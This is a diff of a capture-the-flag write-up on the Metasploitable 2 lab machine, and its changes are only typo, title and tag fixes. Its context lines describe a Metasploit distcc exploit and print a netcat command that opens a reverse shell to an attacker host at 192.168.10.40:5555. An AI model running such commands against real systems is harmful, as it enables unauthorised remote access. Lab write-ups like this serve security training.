@@ -1,7 +1,7 @@
 ---
-title: "CTF 1: Metasploitable 2"
+title: "CTF: Metasploitable 2"
 date: 2023-12-03T09:19:02+02:00
-tags: ["Offsec", "CTFs"]
+tags: ["CTFs"]
 toc: true
 image: "/images/Metasploitable_2/msf.png"
 ---
@@ -106,7 +106,7 @@ Below are the configurable options for this exploit in msf: I set the RHOSTS to 
 
 This exploit also has many payload options, the one I am using is called **cmd/unix/bind_ruby**. Once the payload is set, we can now hit exploit.
 
-Upon exploiting, we have a reverse shell towards teh system, however, this is only a deamon shell with restrictive privileges. Lets Escalate!!
+Upon exploiting, we have a reverse shell towards the system, however, this is only a deamon shell with restrictive privileges. Lets Escalate!!
 
 ![msf_distcc_msf_setpayload.jpg](/images/Metasploitable_2/msf_distcc_msf_setpayload.jpg)
 
@@ -141,7 +141,7 @@ Now we are going to create a shell back to the Kali system from the target's sys
     #!/bin/sh
     /bin/netcat -e /bin/sh 192.168.10.40 5555
 
-Now using **gcc**, we shall compile the code, I saved the output as **pivesc** using the **-o** option for clarity's sake.
+Now using **gcc**, we shall compile the code, I saved the output as **privesc** using the **-o** option for clarity's sake.
 
 I used the **chmod** command to give it full Read, Write & Execute permission too.
 
